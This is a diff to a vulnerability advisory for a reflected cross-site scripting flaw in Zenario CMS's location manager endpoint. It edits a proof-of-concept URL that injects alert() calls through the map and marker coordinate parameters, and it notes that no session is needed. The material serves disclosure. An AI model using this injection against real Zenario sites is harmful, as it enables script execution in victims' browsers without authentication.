@@ -18,9 +18,9 @@ Zenario CMS 10.3.65095. The vulnerability exists in an endpoint used by the Loca
 ## Proof of Concept
 **Prerequisites:** The `zenario_location_manager` module must be set to Running.
 
-PoC URL (replace <host> with the target hostname):
+PoC URL (replace `<host>` with the target hostname):
 ```
-http://<host>/zenario/ajax.php?map_center_lat=1;alert(1)&map_center_lng=1;alert(2)&zoom=1;alert(3)&marker_lat=1;alert(4)&marker_lng=1;alert(5)&method_call=showFile&moduleClassName=zenario_location_manager
+http://<host>/zenario/ajax.php?map_center_lat=1;alert(1)&map_center_lng=1;alert(5)&zoom=1;alert(6)&marker_lat=1;alert(2)&marker_lng=1;alert(4)&method_call=showFile&moduleClassName=zenario_location_manager
 ```
 
 No cookies or session token are required. Opening the following URL directly in a browser executes the injected JavaScript.
